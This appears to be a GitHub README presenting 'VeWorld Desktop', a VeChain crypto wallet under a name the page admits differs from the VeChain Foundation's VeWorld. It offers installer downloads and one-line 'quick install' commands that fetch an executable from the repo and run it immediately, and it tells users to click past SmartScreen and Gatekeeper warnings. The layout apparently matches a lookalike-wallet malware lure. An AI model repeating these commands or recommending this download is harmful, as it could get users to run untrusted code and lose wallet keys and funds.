![VeWorld Desktop](../assets/banner-article.png)

# What Is VeWorld Desktop? The Desktop Wallet, and Which VeWorld It Is

A desktop wallet, and a different product from VeWorld

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

VeWorld Desktop is a self-custody desktop wallet for the VeChainThor network, built by a team working on the VeChain ecosystem, and it runs on Windows, macOS and Linux. It holds VET, VTHO, VIP-180 tokens and NFTs on one 0x address, pairs with a Ledger over USB, and stakes through StarGate without a browser extension.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You searched for a VeChain wallet and found two products with almost the same name, or you are deciding whether a desktop application is the right place to keep keys that a browser extension also offers to hold.

| What you are looking at | What it is | What it does with your keys |
|---|---|---|
| VeWorld Desktop | A desktop wallet for VeChainThor, installed on your machine | Keeps them locally, or on the Ledger you pair |
| VeWorld | The VeChain Foundation's own self-custody wallet | Keeps them in that wallet, on the platforms it publishes for |
| A browser extension wallet | A wallet that runs inside a browser tab | Keeps them in the extension's storage |
| A Ledger device | Hardware that holds keys offline | Keeps them on the device, signs on approval |

## Why it happens

Two products share a name because they share a lineage: VeWorld is the VeChain Foundation's wallet, and VeWorld Desktop is a desktop wallet for the same network built by a company working in that ecosystem. They are separate applications with separate downloads, and the similar naming is the single most common source of confusion in this niche.

The desktop form factor exists because a browser extension is a page-level object. It lives inside a browser profile, it is exposed to whatever the tab can reach, and it inherits a browser's update cycle. An installed application has its own window, its own storage and its own update path, which suits people who hold larger balances, who sign contract calls regularly, or who want their wallet to sit behind the same lock screen as everything else on the machine.

Self-custody is the second thing to understand. The wallet does not hold an account on your behalf; it holds the keys that control an address, encrypted behind a password on your machine. That means no password reset, no support desk that can restore access, and no server that can freeze a balance. It also means the twelve or twenty-four word phrase you write down at setup is the wallet, in a form you can carry.

The tokens it holds are the network's own pair, so <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md">VTHO matters</a> as soon as you send anything.

What the wallet does with that address is ordinary VeChain work: it shows both token balances, tracks VIP-180 tokens and NFTs, estimates fees before a send, warns when a transaction is pointed at the wrong network, and keeps a history with transaction status. Staking, dApp connections and reward applications sit on top of the same address rather than on a separate account.

The practical test of a desktop wallet is whether the account it shows is the account you meant. Two accounts, a Ledger index and a custom derivation path each produce a different address, and every balance on screen belongs to whichever one is selected. Checking the address before reading a balance prevents most of the confusion that a new install produces, and it is the habit that keeps a migrated balance from looking lost.

## Fix

1. Install the current release from the project's GitHub releases page, so the build you run is the published one.
2. Choose create or import. Import accepts a <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a>, a Sync2 keystore file with its password, or a custom derivation path.
3. Write the recovery phrase on paper at setup if you are creating a wallet; it is the only way back in.
4. Add a Ledger if you want device-held keys, then approve on the device rather than in the app.
5. Open the account and confirm the 0x address before sending anything to it.

## If that did not work

If a phrase import produces an address you do not recognise, the phrase is probably being read with a different derivation path or with a different word order. Check the words against the written copy one at a time, and try the alternate path option before concluding the phrase is wrong.

If the app opens to an empty account after a reinstall, the wallet was recreated rather than restored. An empty account is a fresh address; restoring means importing the phrase or keystore, not creating a new wallet.

If a Ledger is connected but no account appears, the device needs the VeChain app open and the account added inside the wallet before it can be selected.

## Prevention

- Keep the recovery phrase offline, on paper, and never type it into a website or a chat.
- Download only from the release page, and check the published checksum for the file you downloaded.
- Confirm the address on the device screen when signing with a Ledger.
- Re-run the current release rather than an older build you have kept on disk.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Is VeWorld Desktop the same as VeWorld?

No. VeWorld is the VeChain Foundation's wallet; VeWorld Desktop is a separate desktop application for the same network, built by a company working in the VeChain ecosystem with its own download and its own release cycle.

### What is a veworld wallet, in one sentence?

It is a self-custody wallet for VeChainThor: the keys stay with the holder, and the wallet signs transactions the holder approves.

### Which operating systems does it support?

Windows, macOS and Linux, as an installed application rather than a browser extension.

### Does it work with a Ledger?

Yes, over a USB connection with the VeChain app open on the device, and every signature is approved on the device itself.

### Can I use it without creating an account anywhere?

Yes. There is no sign-up, no email and no server-side account. The wallet is the keys you hold.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Whether this wallet is safe to use](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)
- [Running it on Windows](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-windows-wallet-veworld-desktop.md)
- [Moving from the VeChainThor wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-thor-wallet-to-veworld-desktop.md)
- [Pairing a Ledger with the desktop app](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)